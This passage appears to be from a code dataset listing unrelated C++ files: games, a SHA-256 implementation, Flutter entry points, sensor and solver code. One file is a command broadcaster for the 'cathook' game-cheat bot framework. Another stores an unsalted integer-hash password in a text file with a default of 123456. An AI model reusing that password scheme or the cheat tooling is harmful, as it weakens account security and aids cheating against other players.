BulletShoot();\r\n        }\r\n    }\r\n}\r\n\r\nvoid MainWindow::EnemyShoot()\r\n{\r\n    QPixmap ebulletImg(\"://90Tank/enemy/pic_13step.png\");\r\n    for(auto enemy : mEnemy){\r\n        if(enemy->rotation()==0){\r\n            QPoint pos(enemy->x()+enemy->pixmap().width()/2,enemy->y());\r\n            enemyBullet* ebullet=new enemyBullet(pos,ebulletImg,'",
    "#include \"sha256.hpp\"\n#include <cstring>\n#include <sstream>\n#include <iomanip>\n\nconstexpr std::array<uint32_t, 64> SHA256::K;\n\nSHA256::SHA256(): m_blocklen(0), m_bitlen(0) {\n\tm_state[0] = 0x6a09e667;\n\tm_state[1] = 0xbb67ae85;\n\tm_state[2] = 0x3c6ef372;\n\tm_state[3] = 0xa54ff53a;\n\tm_state[4] = 0x510e527f;\n\tm_state[5] = 0x9b05688c;\n\tm_state[6] = 0x1f83d9ab;\n\tm_state[7] = 0x5be0cd19;\n}\n\nvoid SHA256::update(const uint8_t * data, size_t length) {\n\tfor (size_t i = 0 ; i < length ; i++) {\n\t\tm_data[m_blocklen++] = data[i];\n\t\tif (m_blocklen == 64) {\n\t\t\ttransform();\n\n\t\t\t// End of the block\n\t\t\tm_bitlen += 512;\n\t\t\tm_blocklen = 0;\n\t\t}\n\t}\n}\n\nvoid SHA256::update(const std::string &data) {\n\tupdate(reinterpret_cast<const uint8_t*> (data.c_str()), data.size());\n}\n\nstd::array<uint8_t,32> SHA256::digest() {\n\tstd::array<uint8_t,32> hash;\n\n\tpad();\n\trevert(hash);\n\n\treturn hash;\n}\n\nuint32_t SHA256::rotr(uint32_t x, uint32_t n) {\n\treturn (x >> n) | (x << (32 - n));\n}\n\nuint32_t SHA256::choose(uint32_t e, uint32_t f, uint32_t g) {\n\treturn (e & f) ^ (~e & g);\n}\n\nuint32_t SHA256::majority(uint32_t a, uint32_t b, uint32_t c) {\n\treturn (a & (b | c)) | (b & c);\n}\n\nuint32_t SHA256::sig0(uint32_t x) {\n\treturn SHA256::rotr(x, 7) ^ SHA256::rotr(x, 18) ^ (x >> 3);\n}\n\nuint32_t SHA256::sig1(uint32_t x) {\n\treturn SHA256::rotr(x, 17) ^ SHA256::rotr(x, 19) ^ (x >> 10);\n}\n\nvoid SHA256::transform() {\n\tuint32_t maj, xorA, ch, xorE, sum, newA, newE, m[64];\n\tuint32_t state[8];\n\n\tfor (uint8_t i = 0, j = 0; i < 16; i++, j += 4) { // Split data in 32 bit blocks for the 16 first words\n\t\tm[i] = (m_data[j] << 24) | (m_data[j + 1] << 16) | (m_data[j + 2] << 8) | (m_data[j + 3]);\n\t}\n\n\tfor (uint8_t k = 16 ; k < 64; k++) { // Remaining 48 blocks\n\t\tm[k] = SHA256::sig1(m[k - 2]) + m[k - 7] + SHA256::sig0(m[k - 15]) + m[k - 16];\n\t}\n\n\tfor(uint8_t i = 0 ; i < 8 ; i++) {\n\t\tstate[i] = m_state[i];\n\t}\n\n\tfor (uint8_t i = 0; i < 64; i++) {\n\t\tmaj   = SHA256::majority(state[0], state[1], state[2]);\n\t\txorA  = SHA256::rotr(state[0], 2) ^ SHA256::rotr(state[0], 13) ^ SHA256::rotr(state[0], 22);\n\n\t\tch = choose(state[4], state[5], state[6]);\n\n\t\txorE  = SHA256::rotr(state[4], 6) ^ SHA256::rotr(state[4], 11) ^ SHA256::rotr(state[4], 25);\n\n\t\tsum  = m[i] + K[i] + state[7] + ch + xorE;\n\t\tnewA = xorA + maj + sum;\n\t\tnewE = state[3] + sum;\n\n\t\tstate[7] = state[6];\n\t\tstate[6] = state[5];\n\t\tstate[5] = state[4];\n\t\tstate[4] = newE;\n\t\tstate[3] = state[2];\n\t\tstate[2] = state[1];\n\t\tstate[1] = state[0];\n\t\tstate[0] = newA;\n\t}\n\n\tfor(uint8_t i = 0 ; i < 8 ; i++) {\n\t\tm_state[i] += state[i];\n\t}\n}\n\nvoid SHA256::pad() {\n\n\tuint64_t i = m_blocklen;\n\tuint8_t end = m_blocklen < 56 ? 56 : 64;\n\n\tm_data[i++] = 0x80; // Append a bit 1\n\twhile (i < end) {\n\t\tm_data[i++] = 0x00; // Pad with zeros\n\t}\n\n\tif(m_blocklen >= 56) {\n\t\ttransform();\n\t\tmemset(m_data, 0, 56);\n\t}\n\n\t// Append to the padding the total message's length in bits and transform.\n\tm_bitlen += m_blocklen * 8;\n\tm_data[63] = m_bitlen;\n\tm_data[62] = m_bitlen >> 8;\n\tm_data[61] = m_bitlen >> 16;\n\tm_data[60] = m_bitlen >> 24;\n\tm_data[59] = m_bitlen >> 32;\n\tm_data[58] = m_bitlen >> 40;\n\tm_data[57] = m_bitlen >> 48;\n\tm_data[56] = m_bitlen >> 56;\n\ttransform();\n}\n\nvoid SHA256::revert(std::array<uint8_t, 32> & hash) {\n\t// SHA uses big endian byte ordering\n\t// Revert all bytes\n\tfor (uint8_t i = 0 ; i < 4 ; i++) {\n\t\tfor(uint8_t j = 0 ; j < 8 ; j++) {\n\t\t\thash[i + (j * 4)] = (m_state[j] >> (24 - i * 8)) & 0x000000ff;\n\t\t}\n\t}\n}\n\nstd::string SHA256::toString(const std::array<uint8_t, 32> & digest) {\n\tstd::stringstream s;\n\ts << std::setfill('0') << std::hex;\n\n\tfor(uint8_t i = 0 ; i < 32 ; i++) {\n\t\ts << std::setw(2) << (unsigned int) digest[i];\n\t}\n\n\treturn s.str();\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"apidata\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// this library is public domain. enjoy!\n// www.ladyada.net/learn/sensors/thermocouple\n\n#ifdef __AVR\n  #include <avr/pgmspace.h>\n#elif defined(ESP8266)\n  #include <pgmspace.h>\n#endif\n#include <util/delay.h>\n#include <stdlib.h>\n#include \"max6675.h\"\n\nMAX6675::MAX6675(int8_t SCLK, int8_t CS, int8_t MISO) {\n  sclk = SCLK;\n  cs = CS;\n  miso = MISO;\n\n  //define pin modes\n  pinMode(cs, OUTPUT);\n  pinMode(sclk, OUTPUT); \n  pinMode(miso, INPUT);\n\n  digitalWrite(cs, HIGH);\n}\ndouble MAX6675::readCelsius(void) {\n\n  uint16_t v;\n\n  digitalWrite(cs, LOW);\n  _delay_ms(1);\n\n  v = spiread();\n  v <<= 8;\n  v |= spiread();\n\n  digitalWrite(cs, HIGH);\n\n  if (v & 0x4) {\n    // uh oh, no thermocouple attached!\n    return NAN; \n    //return -100;\n  }\n\n  v >>= 3;\n\n  return v*0.25;\n}\n\ndouble MAX6675::readFahrenheit(void) {\n  return readCelsius() * 9.0/5.0 + 32;\n}\n\nbyte MAX6675::spiread(void) { \n  int i;\n  byte d = 0;\n\n  for (i=7; i>=0; i--)\n  {\n    digitalWrite(sclk, LOW);\n    _delay_ms(1);\n    if (digitalRead(miso)) {\n      //set the bit to 0 no matter what\n      d |= (1 << i);\n    }\n\n    digitalWrite(sclk, HIGH);\n    _delay_ms(1);\n  }\n\n  return d;\n}\n",
    "\ufeff#include \"solver.h\"\n#include <algorithm>\n#include \"instance.h\"\n#include <tuple>\n\nILOSTLBEGIN\n#define pos(u,v) min(u,v)][max(u,v)\n\n\nSolver::Solver(Instance* instance, string input, string output, double time_limit, double mem_limit)\n\t:instance(instance), inputFile(input), outputFile(output), time_limit(time_limit), mem_limit(mem_limit) {\n\tcerr << \"-- Solving \\n\";\n\tstartTime = chrono::high_resolution_clock::now();\n\toutputFile = instance->instanceName;\n\tgap = 1e5;\n\tstatus = \"-\";\n\n\t/*  SET -------------------------------- */\n\t//n = 50;\n\tN = instance->num_stock;\n\tT = instance->num_scenario;\n\t/*for (int i = 0; i < n; i++)\n\t{\n\t\tn_st.push_back(i);\n\t}*/\n\n\tfor (int i = 0; i < N; i++)\n\t{\n\t\tN_st.push_back(i);\n\t}\n\n\tfor (int i = 0; i < T; i++)\n\t{\n\t\tN_sc.push_back(i);\n\t}\n\n\n\tB = instance->realization;\n\tfor (int i : N_st)\n\t{\n\t\tfor (int j : N_sc)\n\t\t{\n\t\t\tB[i][j] = B[i][j] * -1;\n\t\t}\n\t}\n\tp.resize(T);\n\tq.resize(T);\n\tfor (int i = 0; i < T; i++)\n\t{\n\t\tp[i] = 1.0 / T;\n\t\tq[i] = 1.0 / T;\n\t}\n\talpha = instance->alpha;\n\tcout << \"alpha = \" << alpha << endl;\n}\n\nSolver::~Solver() {\n\t//    cerr << \"Runtime = \" << (double)(clock() - startTime) / CLOCKS_PER_SEC << \"s\\n\";\n}\n\nvoid Solver::Solve() {\n\ttry {\n\t\tcreateModel();\n\n\t\tmasterCplex.exportModel(\"lpex.lp\");\n\t\tmasterCplex.setParam(IloCplex::Param::Parallel, 1);\n\t\tmasterCplex.setParam(IloCplex::Param::MIP::Tolerances::Integrality, 0);\n\t\tmasterCplex.setParam(IloCplex::Param::Threads, 16);\n\t\tmasterCplex.setParam(IloCplex::TiLim, time_limit);\n\t\tmasterCplex.setParam(IloCplex::TreLim, mem_limit);\n\t\tmasterCplex.setParam(IloCplex::Param::MIP::Strategy::RINSHeur, 10);\n\n\t\tmasterCplex.solve();\n\t\tif (masterCplex.getStatus() == IloAlgorithm::Infeasible) {\n\t\t\tcout << UB << endl;\n\t\t\tcout << \"Infeasible\" << endl;\n\t\t}\n\t\telse if (masterCplex.getStatus() == IloAlgorithm::Unbounded) {\n\t\t\tcout << \"Unbounded\" << endl;\n\t\t}\n\t\telse if (masterCplex.getStatus() == IloAlgorithm::Unknown) {\n\t\t\tcout << \"Unknown\" << endl;\n\t\t}\n\t\telse {\n\t\t\tcout << \"DONE ...\" << endl;\n\t\t\tcout << masterCplex.getObjValue() << endl;\n\t\t\tdispay_solution();\n\t\t}\n\n\n\t}\n\tcatch (IloException& e) {\n\t\tcerr << \"Conver exception caught: \" << e << endl;\n\t}\n\tcatch (...) {\n\t\tcerr << \"Unknown exception caught\" << endl;\n\t}\n\n\n\tauto endTime = chrono::high_resolution_clock::now();\n\truntime = chrono::duration_cast<chrono::milliseconds>(endTime - startTime).count();\n\truntime = runtime / 1000;\n\n\n\twrite_output();\n\tcout << \"Environment cleared \\n\";\n\t//        workerCplex.end();\n\tmasterCplex.end();\n\n\t//        workerEnv.end();\n\tmasterEnv.end();\n}\n\nvoid Solver::createModel() {\n\n\tmasterModel = IloModel(masterEnv);\n\tmasterCplex = IloCplex(masterEnv);\n\t\n\tn = IloNumVarArray(masterEnv, T);//n_t\n\tQ = IloNumVarArray(masterEnv, T);//Q_k\n\tm = IloNumVarArray(masterEnv, T);//m_t\n\n\tx = IloNumVarArray(masterEnv, N); // x_i\n\th = IloNumVarArray(masterEnv, N); // h_i\n\tu = IloNumVarArray(masterEnv, T); //u_t\n\td = IloNumVarArray(masterEnv, T); //d_t\n\tL = IloNumVar(masterEnv); //L\n\tlam = IloNumVar(masterEnv); //lam\n\tV = IloNumVar(masterEnv); //V\n\tk = IloNumVarArray(masterEnv, N); //k_i\n\n\n\n\tstringstream name;\n\n\t// x_i\n\tfor (int i : N_st)\n\t{\n\t\tname << \"x.\" << i;\n\t\tx[i] = IloNumVar(masterEnv, 0, IloInfinity, ILOFLOAT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\n\t// h_i\n\tfor (int i : N_st)\n\t{\n\t\tname << \"h.\" << i;\n\t\th[i] = IloNumVar(masterEnv, 0, 1, ILOINT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\n\t// k_i\n\tfor (int i : N_st)\n\t{\n\t\tname << \"k.\" << i;\n\t\tk[i] = IloNumVar(masterEnv, 0, 1, ILOINT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\n\t//u_t\n\tfor (int i : N_sc)\n\t{\n\t\tname << \"u.\" << i;\n\t\tu[i] = IloNumVar(masterEnv, 0, IloInfinity, ILOFLOAT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\t \n\n\t//d_t\n\tfor (int i : N_sc)\n\t{\n\t\tname << \"d.\" << i;\n\t\td[i] = IloNumVar(masterEnv, 0, IloInfinity, ILOFLOAT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\n\n\t//Q_t\n\tfor (int i : N_sc)\n\t{\n\t\tname << \"Q.\" << i;\n\t\tQ[i] = IloNumVar(masterEnv, 0, IloInfinity, ILOFLOAT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\n\t//n_t\n\tfor (int i : N_sc)\n\t{\n\t\tname << \"n.\" << i;\n\t\tn[i] = IloNumVar(masterEnv, 0, IloInfinity, ILOFLOAT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\n\t//m_t\n\tfor (int i : N_sc)\n\t{\n\t\tname << \"m.\" << i;\n\t\tm[i] = IloNumVar(masterEnv, 0, IloInfinity, ILOFLOAT, name.str().c_str());\n\t\tname.str(\"\");\n\t}\n\n\t//V\n\tname << \"V\";\n\tV = IloNumVar(masterEnv, -IloInfinity, IloInfinity, ILOFLOAT, name.str().c_str());\n\tname.str(\"\");\n\n\t//L\n\tname << \"L\";\n\tL = IloNumVar(masterEnv, -IloInfinity, IloInfinity, ILOFLOAT, name.str().c_str());\n\tname.str(\"\");\n\n\t//lam\n\tname << \"lam\";\n\tlam = IloNumVar(masterEnv, 0, IloInfinity, ILOFLOAT, name.str().c_str());\n\tname.str(\"\");\n\n\n\tint BIGM = 9999;\n\n\t// OBJ FUNCTION\n\tIloExpr exprSolution(masterEnv);\n\n\tfor (int t : N_sc)\n\t{\n\t\texprSolution += p[t] * u[t];\n\t}\n\n\t/*IloExpr exprSolution(masterEnv);\n\n\texprSolution += V;*/\n\tmasterModel.add(IloMaximize(masterEnv, exprSolution));\n\t//CONSTRAINT\n\n\tfor (int i : N_sc)\n\t{\n\t\tIloExpr exp(masterEnv);\n\t\tfor (int j : N_st)\n\t\t{\n\t\t\texp += B[j][i] * x[j];\n\t\t}\n\n\t\tmasterModel.add(exp + u[i] - d[i",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"noteapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include\"login.h\"\n#include<iostream>\n#include<Windows.h>\n#include<fstream>\n#include<functional>\nusing namespace std;\n\nbool login() {\n\n\tifstream in(\"password.txt\");\n\tif (!in) {\n\t\tcout << \"\u6587\u4ef6\u6253\u5f00\u5931\u8d25\uff01\" << endl;\n\t\tcout<<\"\u53ef\u80fd\u6709\u6587\u4ef6\u7f3a\u5931\"<<endl;\n\t\tcout << \"\u6b63\u5728\u751f\u6210\u65b0\u6587\u4ef6\" << endl;\n\t\tofstream out(\"password.txt\");\n\t\tif (!out) {\n\t\t\tcout << \"\u6587\u4ef6\u751f\u6210\u5931\u8d25\uff01\" << endl;\n\t\t\treturn false;\n\t\t}\n\n\t\tout << -2073394602;\n\t\tcout << \"\u6587\u4ef6\u751f\u6210\u6210\u529f\uff01\" << endl;\n\t\tcout << \"\u9ed8\u8ba4\u5bc6\u7801\u4e3a123456\" << endl;\n\t\tcout<<\"\u8bf7\u5c3d\u5feb\u4fee\u6539\u5bc6\u7801\" << endl;\n\t\tcout<<\"10\u79d2\u540e\u81ea\u52a8\u9000\u51fa\"<<endl;\n\t\tSleep(10000);\n\t\treturn false;\n\t}\n\tint password;\n\thash<int> hash;\n\tcout << \"\u8bf7\u8f93\u5165\u5bc6\u7801\uff1a\";\n\tcin >> password;\n\tif (password == 0) {\n\t\tcout << \"\u767b\u5f55\u5931\u8d25\uff01\" << endl;\n\t\treturn 0;\n\t}\n\tint hash_password=hash._Do_hash(password);\n\t//cout << hash_password;\n\tpassword = 0;\n\tin >> password;\n\tif (password == hash_password) {\n\t\treturn true;\n\t}\n\telse {\n\n\t\tSleep(10000);\n\t\texit(0);\n\t\treturn false;\n\t}\n}\nbool change_password() {\n\tint password;\n\tcout << \"\u8bf7\u8f93\u5165\u65b0\u5bc6\u7801\uff1a\";\n\tcin >> password;\n\thash<int> hash;\n\tint hash_password;\n\thash_password = hash._Do_hash(password);\n\tfstream out(\"password.txt\", ios::out | ios::trunc);\n\tif (!out)\n\t{\n\t\tcout << \"\u6587\u4ef6\u6253\u5f00\u5931\u8d25\uff01\" << endl;\n\t\treturn false;\n\t}\n\tout << hash_password;\n\tcout << \"\u4fee\u6539\u6210\u529f\uff01\" << endl;\n\treturn true;\n}",
    "/*\n * exec_all.cpp\n *\n *  Created on: Jul 29, 2017\n *      Author: nullifiedcat\n */\n\n#include \"ipcb.hpp\"\n#include \"cathookipc.hpp\"\n\n#include <string>\n#include <iostream>\n\nvoid ReplaceString(std::string& input, const std::string& what, const std::string& with_what)\n{\n    size_t index;\n    index = input.find(what);\n    while (index != std::string::npos)\n    {\n        input.replace(index, what.size(), with_what);\n        index = input.find(what, index + with_what.size());\n    }\n}\n\nint main(int argc, const char** argv)\n{\n    std::string cmd;\n    if (argc < 1)\n        return 1;\n\n    for (int i = 1; i < argc; ++i)\n        cmd += std::string(argv[i]) + \" \";\n\n    auto peer = std::make_unique<cat_ipc::Peer<server_data_s, user_data_s>>(\"cathook_followbot_server\", false, false);\n    peer->Connect();\n\n    std::cout << \"ALL] \" << cmd << std::endl;\n\n    ReplaceString(cmd, \" && \", \" ; \");\n    if (cmd.length() >= 63)\n        peer->SendMessage(nullptr, -1, ipc_commands::execute_client_cmd_long, cmd.c_str(), cmd.length() + 1);\n    else\n        peer->SendMessage(cmd.c_str(), -1, ipc_commands::execute_client_cmd, nullptr, 0);\n}\n",
    "#include \"BOTCOM_main.hpp\"\n\nEstimator estimator;\nSensors sensors;\nPlanner planner;\nController controller;\nNetwork network;\n\nSensorData g_sensor_data;\nEstimatorData g_estimator_data;\nPlannerData g_planner_data;\nNetworkData g_network_data;\n\nStaticSemaphore_t network_data_mutex_buffer;\nSemaphoreHandle_t network_data_mutex = NULL;\n\nStaticSemaphore_t processed_request_mutex_buffer;\nSemaphoreHandle_t processed_request_mutex = NULL;\n\nStaticSemaphore_t satellite_error_mutex_buffer;\nSemaphoreHandle_t satellite_error_mutex = NULL;\n\nTaskHandle_t sat_task_handle = NULL;\n\nvoid SatCom_iteration(void *parameters){\n    while(1){\n\n        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);\n\n        if (xSemaphoreTake(network_data_mutex, portMAX_DELAY) == pdTRUE){\n            network.iteration_3();\n            xSemaphoreGive(network_data_mutex);\n        }\n    }\n}\n\nvoid setup() {\n\n    Serial.begin(115200);\n    delay(5000);\n\n    sensors.setup();\n\n    estimator.setup(g_estimator_data);\n    planner.setup(g_planner_data);\n    \n    controller.setup();\n    network.setup();\n\n    estimator.compass_calibration_auto(controller, g_estimator_data);\n\n    network_data_mutex = xSemaphoreCreateMutexStatic(&network_data_mutex_buffer);\n    processed_request_mutex = xSemaphoreCreateMutexStatic(&processed_request_mutex_buffer);\n    satellite_error_mutex = xSemaphoreCreateMutexStatic(&satellite_error_mutex_buffer);\n\n    // default core is 0\n    xTaskCreatePinnedToCore(\n        SatCom_iteration,      // task name\n        \"sat_com\",          // task name id\n        4096,               // Stack size, can be smaller if needed\n        NULL,               // Task parameters\n        1,                  // Priority\n        &sat_task_handle,   // Task handle\n        1                   // Core\n    );\n\n    // since we are using arduino.h we dont need to call this.\n    // if we remove arduino.h then we need to call this\n    // vTaskStartScheduler();\n\n}// End Setup Function\n\nvoid loop() {\n\n    static unsigned long lastMainLoopMillis = 0;\n    static unsigned long lastSubLoopMillis = 0;\n\n    if (millis() - lastMainLoopMillis >= MAIN_LOOP_PERIOD){\n        lastMainLoopMillis = millis();\n        \n        estimator.gps_iteration(g_estimator_data.gps_data);\n        estimator.compass_iteration(g_estimator_data.compass_data);\n\n        planner.iteration(g_estimator_data, g_planner_data, g_network_data);\n        controller.iteration(g_planner_data, g_estimator_data);\n\n        sensors.update_sensor_data(g_sensor_data);\n        \n        if (xSemaphoreTake(network_data_mutex, 10) == pdTRUE){\n            if (sat_task_handle != NULL){\n                network.sync_network_data(g_estimator_data, g_planner_data, g_sensor_data, g_network_data);\n                xSemaphoreGive(network_data_mutex);\n                xTaskNotifyGive(sat_task_handle);\n                delay(5);\n            }\n        }\n        else{\n            g_network_data.network_state = network.get_network_state();\n        }\n        print_debug_dump_general(g_estimator_data, g_planner_data, g_sensor_data, g_network_data);\n    }// End of Main Loop\n\n    if (millis() - lastSubLoopMillis >= MINOR_LOOP_NAV_PERIOD){\n        lastSubLoopMillis = millis();\n        set_log_mode(false);\n\n        estimator.compass_iteration(g_estimator_data.compass_data);\n        controller.iteration(g_planner_data, g_estimator_data);\n\n        set_log_mode(true);\n    }// End of Minor Loop\n\n}// End Loop Function",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"VeilCharacterBase.h\"\n#include \"Net/UnrealNetwork.h\"\n\n// Sets default values\nAVeilCharacterBase::AVeilCharacterBase()\n{\n \t// Set this character to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = false;\n\n\tabilitySystemComponent = CreateDefaultSubobject<UAbilitySystemComponent>(TEXT(\"AbilitySystemComponent\"));\n\tabilitySystemComponent->SetIsReplicated(true);\n\n\tattributeSet = CreateDefaultSubobject<UVeilAttributeSet>(TEXT(\"AttributeSet\"));\n\n\t\n}\n\n// Called when the game starts or when spawned\nvoid AVeilCharacterBase::BeginPlay()\n{\n\tSuper::BeginPlay();\n\tif (IsValid(abilitySystemComponent)) {\n\t\tabilitySystemComponent->InitAbilityActorInfo(this, this);\n\t\tattributeSet = abilitySystemComponent->GetSet<UVeilAttributeSet>();\n\t}\n}\n\n// Called every frame\nvoid AVeilCharacterBase::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n}\n\n// Called to bind functionality to input\nvoid AVeilCharacterBase::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\tSuper::SetupPlayerInputComponent(PlayerInputComponent);\n\n}\n\nint AVeilCharacterBase::getTeam()\n{\n\treturn team;\n}\n\nvoid AVeilCharacterBase::setTeam(int newTeam)\n{\n\tteam = newTeam;\n}\n\nvoid AVeilCharacterBase::PossessedBy(AController* newController) \n{\n\tSuper::PossessedBy(newController);\n\n\tSetOwner(newController);\n}\n\nvoid AVeilCharacterBase::GetLifetimeReplicatedProps(class TArray<class FLifetimeProperty>& OutLifetimeProps) const {\n\tSuper::GetLifetimeReplicatedProps(OutLifetimeProps);\n\n\tDOREPLIFETIME(AVeilCharacterBase, team);\n}",
    "//-----------------------//\r\n//   CODIGO HECHO POR    //\r\n//   Aquiles Mill\u00e1n      //\r\n//   V31.706.783         //\r\n//   Alonso Acosta       //\r\n//   V31.460.751         //\r\n//   Nicole Becerra      //\r\n//   V                   //\r\n// C\u00e1tedra: Algortimos   //\r\n// y estructuras de datos //\r\n//-----------------------//\r\n\r\n// Proyecto finalizado:\r\n// Durante estas ultimas semanas del semestre ha sido muy complicado trabajar en el codigo, ademas que tuvimos que reconstruirlo, se presentaron problemas familiares y otros incovenientes\r\n// Eso causo muchos problemas de tiempo y desarrollo del codigo en terminos generales\r\n// Debido a esto falta por terminar funciones del combate, el martes probablemente podremos terminar lo que falte, espero pueda entender profesor, disculpe las molestias...\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <bits/stdc++.h>\r\n#include <fstream>\r\n#include <string>\r\n#include <sstream>\r\n#include <algorithm> \r\n#include <random>\r\n#include <cstdlib>    \r\nusing namespace std;\r\n\r\nstruct Ambientes\r\n{\r\n    std:: string nombre;\r\n};\r\n\r\nstd::vector<Ambientes>Ambienteslista;\r\n\r\nstruct Objetos\r\n{\r\n    std:: string nombre;\r\n    std:: string tipo;\r\n    int valor;\r\n    std:: string recuperacion;\r\n    int energia;\r\n    int contenedor;\r\n};\r\n\r\nstd::vector<Objetos>Objetoslista;\r\n\r\nstruct Especies\r\n{\r\n    std:: string nombre;\r\n    int energia;\r\n    int salud;\r\n    std:: string ambiente;\r\n};\r\n\r\nstd::vector<Especies>Especieslista;\r\n\r\nstruct Soldados\r\n{\r\n    std::string nombre;\r\n    std::string especie;\r\n    int energia;\r\n    int salud;\r\n    std::vector<Objetos>MochilaList;\r\n};\r\n\r\nstd::vector<Soldados>Soldadoslista;\r\nstd::vector<Soldados>equipo1;\r\nstd::vector<Soldados>equipo2;\r\n\r\nstd::string elegirambiente(std::string& ambienterandom)\r\n{\r\n    int randomIndex = rand() % Ambienteslista.size();\r\n    ambienterandom = Ambienteslista[randomIndex].nombre;\r\n    return ambienterandom;\r\n}\r\n\r\nvoid mostrarequipos()\r\n{\r\n    std::cout << \"=================\\n\";\r\n    std::cout << \"    EQUIPO 1:\\n\";\r\n    std::cout << \"=================\\n\";\r\n    for(int i = 0; i < equipo1.size(); i++)\r\n    {\r\n        std::cout <<\"Soldado \" << i << \": \" << equipo1[i].nombre << \"\\n\";\r\n        std::cout << \"Energia: \" << equipo1[i].energia << \"\\n\";\r\n        std::cout << \"Salud: \" << equipo1[i].salud << \"\\n\";\r\n        std::cout << \"=================\\n\";\r\n\r\n    }\r\n    std::cout << \"\\n=================\\n\";\r\n    std::cout << \"    EQUIPO 2:\\n\";\r\n    std::cout << \"=================\\n\";\r\n    for(int i = 0; i < equipo2.size(); i++)\r\n    {\r\n        std::cout <<\"Soldado \" << i << \": \" << equipo2[i].nombre << \"\\n\";\r\n        std::cout << \"Energia: \" << equipo2[i].energia << \"\\n\";\r\n        std::cout << \"Salud: \" << equipo2[i].salud << \"\\n\";\r\n        std::cout << \"=================\\n\";\r\n    }\r\n}\r\n\r\nvoid randomizarequipos()\r\n{\r\n    std::random_device rd;\r\n    std::mt19937 gen(rd());\r\n\r\n    std::shuffle(Soldadoslista.begin(), Soldadoslista.end(), gen);\r\n\r\n    equipo1.assign(Soldadoslista.begin(), Soldadoslista.begin() + 3);\r\n    equipo2.assign(Soldadoslista.begin() + 3, Soldadoslista.end());\r\n}\r\n\r\nvoid creaciondesoldados(int z,Soldados soldado1)\r\n{\r\n    std::cout << \"\\nNombre del soldado \" << z << \": \";\r\n    std::getline(std::cin, soldado1.nombre);\r\n    bool verif = false;\r\n    while(verif == false)\r\n    {\r\n        std::cout << \"\\nEspecie del soldado \" << z << \": \";\r\n        std::string especie;\r\n        std::cin.clear();\r\n        std::getline(std::cin, especie);\r\n        for(int i = 0; i < Especieslista.size(); i++)\r\n        {\r\n            if(Especieslista[i].nombre == especie)\r\n            {\r\n                soldado1.especie = especie;\r\n                soldado1.energia = Especieslista[i].energia;\r\n                soldado1.salud = Especieslista[i].salud;\r\n                verif = true;\r\n            }\r\n        }\r\n        if(verif == false)\r\n        {\r\n            std::cout << \"\\nEspecie no valida, ingresa una especie valida.\\n\";\r\n        }\r\n    }\r\n    \r\n    std::cout<< \"==================================================\\n\";\r\n    std::cout <<\" Selecciona los objetos en la mochila del soldado: \\n\";\r\n    std::cout<< \"==================================================\\n\";\r\n    for(int i = 0; i < 5; i++)\r\n    {\r\n        bool verif2 = false;\r\n        while(verif2 == false)\r\n        {\r\n            std::cout << \"\\n\\nObjeto \" << i+1 << \": \";\r\n            std::string nombreobjeto;\r\n            std::getline(std::cin, nombreobjeto);\r\n            for(int j = 0; j < Objetoslista.size(); j++)\r\n            {\r\n                if(Objetoslista[j].nombre == nombreobjeto)\r\n                {\r\n                    soldado1.MochilaList.push_back(Objetoslista[j]);\r\n                    verif2 = true;\r\n                }\r\n            }\r\n            if(verif2 == false)\r\n            {\r\n                std::cout << \"\\nObjeto no valido, ingresa un objeto 